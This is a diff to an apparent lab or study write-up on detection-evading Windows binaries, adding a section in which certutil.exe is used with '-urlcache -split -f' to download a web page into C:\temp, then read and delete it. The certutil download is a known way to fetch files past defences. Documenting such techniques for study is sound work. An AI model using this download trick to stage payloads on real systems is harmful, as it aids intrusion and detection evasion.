@@ -228,11 +228,24 @@ Document Format:
 
 Make a temp directory to work with for this section: mkdir C\:temp
 
-1.
+1. certutil.exe
 
-Command:
+Commands:
+
+Create our temporary directory ```mkdir C:\temp```
+
+Exploit certutil.exe. ```certutil.exe -urlcache -split -f https://genji.pk/ C:\temp\test.txt``` This cmd downloads this website's page and puts it into test.txt in temp dir.
+
+Read the file ```type C:\temp\test.txt```
+
+Delete the file ```del C:\temp\test.txt```
 
 Screenshot:
+<img width="550" height="93" alt="image" src="https://github.com/user-attachments/assets/f54a651d-d16b-4d3a-a9fc-bfa6688cf833" />
+
+<img width="425" height="193" alt="image" src="https://github.com/user-attachments/assets/dd0f1e46-9d37-4bbc-9f64-87a184a4291f" />
+
+<img width="1013" height="709" alt="image" src="https://github.com/user-attachments/assets/7a71aefe-bf16-463f-9c3d-446cd4434ad2" />
 
 How/Why it Evades Detection:
 
